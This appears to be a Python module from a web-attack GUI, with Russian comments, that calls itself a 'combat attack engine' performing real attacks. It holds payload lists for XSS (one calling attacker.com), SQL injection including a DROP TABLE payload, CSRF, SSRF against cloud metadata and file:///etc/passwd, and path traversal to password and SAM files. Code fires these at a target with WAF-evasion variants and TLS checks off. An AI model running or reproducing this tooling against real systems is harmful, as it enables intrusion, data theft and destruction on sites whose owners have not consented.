# xss_security_gui/combat_attack_engine.py
"""
Combat Attack Engine — Реальные боевые сетевые атаки
"""
import time
import json
import requests
import threading
import queue
from typing import Dict, List, Any, Callable, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
import logging

from xss_security_gui.core.waf_engine import WAFDetector, HTTPEvasionWrapper, WAFType
from xss_security_gui.core.waf_monitor import get_waf_monitor

logger = logging.getLogger("CombatAttackEngine")

# ============================================================
#  Payload Templates (Боевые шаблоны)
# ============================================================

XSS_PAYLOADS = [
    '<img src=x onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '<img src=x onerror=fetch("http://attacker.com/log?xss=1")>',
    '<svg/onload=eval(atob("YWxlcnQoJ1hTUycp"))>',
    'jaVasCript:/**/alert("XSS")',
    '<marquee onstart="alert(\'XSS\')">',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'--",
    "1' UNION SELECT NULL--",
    "1'; DROP TABLE users--",
    "1' AND '1'='1",
    "admin' --",
    "1' OR 1=1--",
    "' UNION ALL SELECT NULL,NULL--",
    "1' AND SLEEP(5)--",
    "1' OR 'a'='a",
]

CSRF_PAYLOADS = [
    '<img src="http://target.com/api/admin/delete?user_id=1">',
    '<iframe src="http://target.com/api/settings/update?admin=true"></iframe>',
    '<form action="http://target.com/api/transfer" method="POST"><input name="amount" value="1000"><script>document.forms[0].submit()</script></form>',
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:8080",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/admin",
    "file:///etc/passwd",
    "http://127.0.0.1:3306/",
    "gopher://localhost:25/",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/hosts",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

# ============================================================
#  Attack Result Class
# ============================================================

class AttackResult:
    """Результат одиночной атаки"""

    def __init__(self, attack_type: str, endpoint: str, payload: str):
        self.attack_type = attack_type
        self.endpoint = endpoint
        self.payload = payload
        self.timestamp = datetime.now().isoformat()
        self.success = False
        self.vulnerable = False
        self.response_code = None
        self.response_time = 0.0
        self.response_body = ""
        self.evidence = []
        self.severity = "INFO"
        self.notes = ""
        self.detected_waf: Optional[WAFType] = None
        self.waf_confidence: float = 0.0
        self.evasion_attempts: int = 0
        self.evasion_success: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type,
            "endpoint": self.endpoint,
            "payload": self.payload[:100],
            "vulnerable": self.vulnerable,
            "severity": self.severity,
            "response_code": self.response_code,
            "response_time": round(self.response_time, 3),
            "timestamp": self.timestamp,
            "notes": self.notes,
            "evidence_count": len(self.evidence),
            "detected_waf": self.detected_waf.value if self.detected_waf else None,
            "waf_confidence": self.waf_confidence,
            "evasion_attempts": self.evasion_attempts,
            "evasion_success": self.evasion_success,
        }


# ============================================================
#  Combat Attack Engine
# ============================================================

class CombatAttackEngine:
    """
    Боевой двигатель атак.
    Выполняет реальные XSS, SQLi, CSRF, SSRF, LFI атаки.
    Интегрирован с WAFDetector 13.0 для автоматического обхода WAF.
    Результаты отправляются в очередь для GUI.
    """

    def __init__(self,
                 target_url: str,
                 result_queue: queue.Queue,
                 progress_callback: Optional[Callable] = None,
                 timeout: float = 10.0):
        self.target_url = target_url
        self.result_queue = result_queue
        self.progress_callback = progress_callback
        self.timeout = timeout
        self.stop_flag = threading.Event()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (XSS-Scanner v6.0)",
            "Accept": "*/*"
        })

        # WAFDetector 13.0 Integration
        self.waf_detector = WAFDetector()
        self.waf_monitor = get_waf_monitor()
        self.waf_evasion_wrapper = HTTPEvasionWrapper(self.session.headers.copy())
        self.detected_waf: Optional[WAFType] = None
        self.waf_detection_confidence: float = 0.0

        self.attack_results: List[AttackResult] = []
        self.total_attacks = 0
        self.completed_attacks = 0

    def _emit_progress(self, msg: str, progress_pct: int = 0):
        """Отправить сообщение прогресса"""
        if self.progress_callback:
            try:
                self.progress_callback(msg, progress_pct)
            except Exception as e:
                logger.warning(f"Progress callback error: {e}")

        # Также отправляем в очередь
        try:
            self.result_queue.put({
                "type": "progress",
                "message": msg,
                "progress": progress_pct,
                "timestamp": datetime.now().isoformat()
            }, timeout=1)
        except queue.Full:
            pass

    def _emit_result(self, result: AttackResult):
        """Отправить результат атаки"""
        self.attack_results.append(result)
        self.completed_attacks += 1

        try:
            self.result_queue.put({
                "type": "attack_result",
                "data": result.to_dict(),
                "timestamp": datetime.now().isoformat()
            }, timeout=1)
        except queue.Full:
            pass

        # Прогресс
        progress_pct = int((self.completed_attacks / max(1, self.total_attacks)) * 100)
        self._emit_progress(f"🎯 Атак выполнено: {self.completed_attacks}/{self.total_attacks}", progress_pct)

    def _detect_and_adapt_waf(self) -> Optional[WAFType]:
        """Обнаружить WAF и адаптировать payload для обхода"""
        if self.detected_waf:
            return self.detected_waf

        try:
            resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            detected = self.waf_detector.detect_waf(
                self.target_url,
                resp.text,
                dict(resp.headers),
                resp.status_code
            )

            if detected:
                waf_info = self.waf_detector.detected_wafes.get(self.target_url, {})
                self.waf_detection_confidence = waf_info.get("confidence", 0.0)
                self.detected_waf = detected

                # Record in WAF Monitor
                self.waf_monitor.record_waf_detection(
                    self.target_url,
                    detected,
                    self.waf_detection_confidence,
                    waf_info.get("score", 0)
                )

                self._emit_progress(
                    f"⚠️ WAF обнаружен: {detected.value} (уверенность: {self.waf_detection_confidence * 100:.1f}%)",
                    10
                )
                logger.info(f"WAF detected: {detected.value}")
                return detected
        except Exception as e:
            logger.debug(f"WAF detection error: {e}")

        return None

    def _get_adapted_payloads(self, original_payload: str, max_variants: int = 15) -> List[str]:
        """Получить адаптированные payload с учетом обнаруженного WAF"""
        payloads = [original_payload]

        try:
            evasion_payloads = self.waf_detector.get_evasion_payloads(
                original_payload,
                self.detected_waf,
                max_variants
            )
            payloads.extend(evasion_payloads)
        except Exception as e:
            logger.debug(f"Payload adaptation error: {e}")

        return payloads[:max_variants]

    def attack_xss(self, endpoints: List[str] = None) -> List[AttackResult]:
        """Атака на XSS уязвимости"""
        if not endpoints:
            endpoints = [self.target_url]

        self._emit_progress(f"🔴 Начинаем XSS атаки на {len(endpoints)} endpoints...", 5)

        # Обнаружить WAF
        self._detect_and_adapt_waf()

        results = []

        for endpoint in endpoints:
            if self.stop_flag.is_set():
                break

            for payload in XSS_PAYLOADS:
                if self.stop_flag.is_set():
                    break

                result = AttackResult("XSS", endpoint, payload)
                result.detected_waf = self.detected_waf
                result.waf_confidence = self.waf_detection_confidence

                try:
                    # Получить адаптированные payload для обхода WAF
                    adapted_payloads = self._get_adapted_payloads(payload, max_variants=10)

                    for attempt_num, test_payload in enumerate(adapted_payloads, 1):
                        if self.stop_flag.is_set():
                            break

                        result.evasion_attempts = attempt_num

                        # Попытка 1: GET параметр
                        test_url = f"{endpoint}?q={test_payload}" if "?" not in endpoint else f"{endpoint}&q={test_payload}"

                        try:
                            start_time = time.time()
                            resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                            result.response_time = time.time() - start_time
                            result.response_code = resp.status_code
                            result.response_body = resp.text[:1000]
                            result.success = True

                            # Анализ ответа на наличие payload
                            if payload in resp.text:
                                result.vulnerable = True
                                result.severity = "HIGH"
                                result.evidence.append(f"Payload отражен в ответе (попытка {attempt_num})")
                                result.notes = f"Уязвим на XSS (отражен payload)"
                                result.evasion_success = True
                                break
                            elif "error" in resp.text.lower() or "invalid" in resp.text.lower():
                                if not result.vulnerable:
                                    result.severity = "MEDIUM"
                                    result.notes = "Возможна парсинговая ошибка"

                        except Exception as e:
                            logger.debug(f"XSS GET attempt {attempt_num} error: {e}")
                            continue

                        # Попытка 2: POST параметр
                        if not result.vulnerable and attempt_num <= 3:
                            try:
                                post_resp = self.session.post(endpoint,
                                                              data={"q": test_payload},
                                                              timeout=self.timeout,
                                                              verify=False)
                                if payload in post_resp.text:
                                    result.vulnerable = True
                                    result.severity = "HIGH"
                                    result.evidence.append(f"Payload отражен в POST ответе (попытка {attempt_num})")
                                    result.notes = "Уязвим на XSS (POST)"
                                    result.evasion_success = True
                                    break
                            except Exception:
                                pass

                    if result.vulnerable or result.success:
                        self._emit_result(result)
                        results.append(result)

                    time.sleep(0.1)  # Rate limit

                except Exception as e:
                    result.notes = f"Ошибка: {str(e)[:100]}"
                    logger.debug(f"XSS attack error: {e}")

        return results

    def attack_sqli(self, params: Dict = None) -> List[AttackResult]:
        """Атака на SQL Injection"""
        self._emit_progress(f"🟠 Начинаем SQLi атаки...", 30)
        results = []

        if not params:
            params = {"id": "1", "user": "admin", "search": "test"}

        for param_name, param_value in params.items():
            if self.stop_flag.is_set():
                break

            for payload in SQLI_PAYLOADS:
                if self.stop_flag.is_set():
                    break

                result = AttackResult("SQLi", f"{self.target_url}?{param_name}=...", payload)
                result.detected_waf = self.detected_waf
                result.waf_confidence = self.waf_detection_confidence

                try:
                    # Получить адаптированные payload
                    adapted_payloads = self._get_adapted_payloads(payload, max_variants=8)

                    for attempt_num, test_payload in enumerate(adapted_payloads, 1):
                        if self.stop_flag.is_set():
                            break

                        result.evasion_attempts = attempt_num

                        try:
                            test_params = {param_name: test_payload}

                            start_time = time.time()
                            resp = self.session.get(self.target_url,
                                                   params=test_params,
                                                   timeout=self.timeout,
                                                   verify=False)
                            result.response_time = time.time() - start_time
                            result.response_code = resp.status_code
                            result.response_body = resp.text[:1000]
                            result.success = True

                            # Анализ на SQLi признаки
                            sqli_indicators = ["sql", "syntax", "error", "mysql", "postgresql", "oracle", "database"]
                            if any(ind in resp.text.lower() for ind in sqli_indicators):
                                result.vulnerable = True
                                result.severity = "CRITICAL"
                                result.evidence.append(f"SQL ошибка в ответе (попытка {attempt_num})")
                                result.notes = "Потенциально уязвим на SQLi"
                                result.evasion_success = True
                                break

                            # Проверка времени ответа (time-based SQLi)
                            if result.response_time > 5.0:
                                result.notes = f"Время ответа: {result.response_time:.2f}s - возможен time-based SQLi (попытка {attempt_num})"
                                if not result.vulnerable:
                                    result.vulnerable = True
                                    result.severity = "HIGH"
                                    result.evasion_success = True
                                    break

                        except Exception as e:
                            logger.debug(f"SQLi attempt {attempt_num} error: {e}")
                            continue

                    if result.vulnerable or result.success:
                        self._emit_result(result)
                        results.append(result)

                    time.sleep(0.2)

                except Exception as e:
                    result.notes = f"Ошибка: {str(e)[:100]}"
                    logger.debug(f"SQLi attack error: {e}")

        return results

    def attack_csrf(self) -> List[AttackResult]:
        """Атака на CSRF"""
        self._emit_progress(f"🟡 Проверяем CSRF защиту...", 55)
        results = []

        for payload in CSRF_PAYLOADS[:3]:
            if self.stop_flag.is_set():
                break

            result = AttackResult("CSRF", self.target_url, payload)
            result.detected_waf = self.detected_waf
            result.waf_confidence = self.waf_detection_confidence

            try:
                resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
                result.response_code = resp.status_code
                result.success = True

                csrf_indicators = ["csrf", "token", "crumb", "nonce", "_token"]
                has_csrf_protection = any(ind in resp.text.lower() for ind in csrf_indicators)

                if not has_csrf_protection:
                    result.vulnerable = True
                    result.severity = "HIGH"
                    result.evidence.append("Отсутствует CSRF защита")
                    result.notes = "Форма не защищена CSRF токеном"
                else:
                    result.notes = "Форма содержит CSRF защиту"

                self._emit_result(result)
                results.append(result)

            except Exception as e:
                result.notes = f"Ошибка: {str(e)[:100]}"
                logger.debug(f"CSRF attack error: {e}")

        return results

    def attack_ssrf(self) -> List[AttackResult]:
        """Атака на SSRF"""
        self._emit_progress(f"🔵 Проверяем SSRF...", 70)
        results = []

        for payload in SSRF_PAYLOADS[:5]:
            if self.stop_flag.is_set():
                break

            result = AttackResult("SSRF", self.target_url, payload)
            result.detected_waf = self.detected_waf
            result.waf_confidence = self.waf_detection_confidence

            try:
                # Получить адаптированные payload
                adapted_payloads = self._get_adapted_payloads(payload, max_variants=5)

                for attempt_num, test_payload in enumerate(adapted_payloads, 1):
                    if self.stop_flag.is_set():
                        break

                    result.evasion_attempts = attempt_num

                    try:
                        test_url = f"{self.target_url}?url={test_payload}" if "?" not in self.target_url else f"{self.target_url}&url={test_payload}"

                        start_time = time.time()
                        resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                        result.response_time = time.time() - start_time
                        result.response_code = resp.status_code
                        result.success = True

                        # Анализ на SSRF признаки
                        if resp.status_code == 200 and len(resp.text) > 100:
                            result.vulnerable = True
                            result.severity = "CRITICAL"
                            result.evidence.append(f"Возможен доступ к внутренним ресурсам (попытка {attempt_num})")
                            result.notes = "Потенциально уязвим на SSRF"
                            result.evasion_success = True
                            break

                    except Exception as e:
                        logger.debug(f"SSRF attempt {attempt_num} error: {e}")
                        continue

                if result.vulnerable or result.success:
                    self._emit_result(result)
                    results.append(result)

                time.sleep(0.1)

            except Exception as e:
                result.notes = f"Ошибка: {str(e)[:100]}"

        return results

    def attack_lfi(self) -> List[AttackResult]:
        """Атака на LFI"""
        self._emit_progress(f"🟣 Проверяем LFI...", 85)
        results = []

        for payload in LFI_PAYLOADS[:5]:
            if self.stop_flag.is_set():
                break

            result = AttackResult("LFI", self.target_url, payload)
            result.detected_waf = self.detected_waf
            result.waf_confidence = self.waf_detection_confidence

            try:
                # Получить адаптированные payload
                adapted_payloads = self._get_adapted_payloads(payload, max_variants=5)

                for attempt_num, test_payload in enumerate(adapted_payloads, 1):
                    if self.stop_flag.is_set():
                        break

                    result.evasion_attempts = attempt_num

                    try:
                        test_url = f"{self.target_url}?file={test_payload}" if "?" not in self.target_url else f"{self.target_url}&file={test_payload}"

                        resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                        result.response_code = resp.status_code
                        result.success = True

                        # Анализ на LFI признаки
                        lfi_indicators = ["root:", "bin:", "daemon:", "nobody:"]
                        if any(ind in resp.text for ind in lfi_indicators):
                            result.vulnerable = True
                            result.severity = "CRITICAL"
                            result.evidence.append(f"Файл /etc/passwd может быть доступен (попытка {attempt_num})")
                            result.notes = "Потенциально уязвим на LFI"
                            result.evasion_success = True
                            break

                    except Exception as e:
                        logger.debug(f"LFI attempt {attempt_num} error: {e}")
                        continue

                if result.vulnerable or result.success:
                    self._emit_result(result)
                    results.append(result)

                time.sleep(0.1)

            except Exception as e:
                result.notes = f"Ошибка: {str(e)[:100]}"

        return results

    def run_all_attacks(self) -> Dict[str, Any]:
        """Запустить все атаки последовательно"""
        self._emit_progress("🚀 Запуск полного боевого цикла атак...", 1)

        # Обнаружить WAF перед началом
        self._detect_and_adapt_waf()

        all_results = {
            "xss": self.attack_xss(),
            "sqli": self.attack_sqli(),
            "csrf": self.attack_csrf(),
            "ssrf": self.attack_ssrf(),
            "lfi": self.attack_lfi(),
        }

        # ============================================
        # 🔥 FLOODER INTEGRATION (XSS Flooder ULTRA)
        # ============================================
        try:
            from xss_security_gui.auto_recon.xss_flooder import ai_learning_data

            flood_xss = [
                {"payload": p, "type": "xss", "vulnerable": True}
                for p in ai_learning_data.get("successful_xss", [])
            ]

            flood_sqli = [
                {"payload": p, "type": "sqli", "vulnerable": True}
                for p in ai_learning_data.get("successful_sqli", [])
            ]

            all_results["flood_xss"] = flood_xss
            all_results["flood_sqli"] = flood_sqli

            # Combat event → GUI
            self.result_queue.put({
                "type": "flooder_results",
                "data": {
                    "xss_found": len(flood_xss),
                    "sqli_found": len(flood_sqli),
                    "payloads_xss": flood_xss,
                    "payloads_sqli": flood_sqli,
                },
                "timestamp": datetime.now().isoformat()
            })

        except Exception as e:
            logger.error(f"[CombatAttackEngine] Flooder integration error: {e}")

        # Анализ результатов
        vulnerable_count = sum(1 for results in all_results.values()
                               for r in results if r.vulnerable)
        critical_count = sum(1 for results in all_results.values()
                            for r in results if r.severity == "CRITICAL")
        successful_evasion_count = sum(1 for results in all_results.values()
                                      for r in results if r.evasion_success)

        # Запись статистики обходов в WAF Monitor
        if self.detected_waf:
            for results in all_results.values():
                for r in results:
                    if r.evasion_success:
                        self.waf_monitor.record_evasion_attempt(
                            self.detected_waf,
                            success=True,
                            payload_variant=r.payload[:50]
                        )
                    elif r.evasion_attempts > 0:
                        self.waf_monitor.record_evasion_attempt(
                            self.detected_waf,
                            success=False,
                            payload_variant=r.payload[:50]
                        )

        waf_info = f" (WAF: {self.detected_waf.value} {self.waf_detection_confidence * 100:.1f}%)" if self.detected_waf else " (No WAF detected)"

        self._emit_progress(
            f"✅ Атаки завершены! Уязвимостей: {vulnerable_count}, CRITICAL: {critical_count}, Успешных обходов: {successful_evasion_count}{waf_info}",
            100
        )

        return {
            "target": self.target_url,
            "timestamp": datetime.now().isoformat(),
            "total_attacks": self.completed_attacks,
            "vulnerable_found": vulnerable_count,
            "critical_severity": critical_count,
            "successful_evasions": successful_evasion_count,
            "detected_waf": self.detected_waf.value if self.detected_waf else None,
            "waf_confidence": self.waf_detection_confidence,
            "waf_evasion_success_rate": self.waf_monitor.evasion_stats.get(
                self.detected_waf.value if self.detected_waf else None, {}
            ).get("success_rate", 0.0),
            "results_by_type": all_results,
        }

    def stop(self):
        """Остановить атаки"""
        self.stop_flag.set()
        self._emit_progress("⏸️ Атаки остановлены", 0)

